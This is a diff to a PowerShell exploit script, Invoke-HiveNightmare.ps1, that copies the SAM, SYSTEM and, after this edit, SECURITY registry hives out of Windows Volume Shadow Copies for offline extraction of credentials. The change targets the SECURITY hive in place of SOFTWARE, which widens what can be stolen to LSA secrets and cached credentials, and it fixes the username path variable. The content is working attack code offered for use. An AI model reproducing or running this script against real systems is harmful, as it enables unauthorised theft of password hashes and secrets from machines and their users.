@@ -20,17 +20,17 @@
     .NOTES  
         File Name      : Invoke-HiveNightmare.ps1
         Version        : v.0.2
-        Author         : @WiredPulse
+        Author         : @WiredPulse, Edit: @ZephrFish
         Created        : 21 Jul 21
 #>
 
 [CmdletBinding()]
 param(
-       $path = "C:\Users\$username\Desktop"
+       $path = "C:\Users\$env:USERNAME\Desktop"
 )
 
 $outSam = "$path\Sam.hive"
-$outSoft = "$path\Soft.hive"
+$outSoft = "$path\Security.hive"
 $outSys = "$path\Sys.hive"
 
 if(-not(test-path $path)){
@@ -52,8 +52,8 @@ for($i = 1; $i -le 9; $i++){
         Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SAM$i hive..."
     } catch{}
     try{
-        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\software"), ($outSoft + $i))
-        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SOFTWARE$i hive..."
+        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\security"), ($outSoft + $i))
+        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SECURITY$i hive..."
     }
     catch{}
     try{
